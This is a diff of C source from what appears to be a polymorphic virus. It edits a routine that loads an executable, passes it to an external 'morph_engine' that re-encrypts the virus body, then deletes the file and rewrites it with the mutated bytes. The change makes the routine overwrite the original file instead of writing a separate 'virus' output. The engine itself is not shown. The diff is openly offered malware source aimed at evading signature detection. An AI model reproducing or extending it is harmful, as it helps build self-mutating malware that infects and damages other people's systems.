@@ -11,7 +11,6 @@
 char *filename;
 
 extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
-// extern int decrypt_engine(char* exe_data,size_t full_addr_enc_begin ,size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
 int getfilename(int argc, char *argv[]){
 
 	// get the file name from argument
@@ -27,7 +26,7 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 	// seed the random number generator
 	srand(time(NULL));
 
-	// unsigned long main_int =  4656;
+	// convert hex value of _main_ offset to unsigned long
 	unsigned long main_int =  (int)strtol(_main_, NULL, 16);
 	// get base address of executable
 	unsigned long base_addr = virus_instruction_begin - main_int;
@@ -47,7 +46,7 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 	if(!string)
 	{
 			fclose(filename);
-			printf("Executable data allocation failed\n");
+			printf("Data allocation failed\n");
 			return 1;
 	}
 	fread(string, 1, fsize, f);
@@ -58,14 +57,15 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 	// call the polymorphic engine
 	if(morph_engine(string, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
 	{
-		printf("An error occured in the polymorphic engine\n");
+		printf("Error in polymorphic engine\n");
 
 	}
 
+	// important, remove the file if not the write will fail later on
 	remove(filename);
 
 
-	FILE* out_file = fopen("virus", "wb");
+	FILE* out_file = fopen(filename, "wb");
 	// write the modified executable data
 	fwrite(string, fsize, 1, out_file);
 	fclose(out_file);
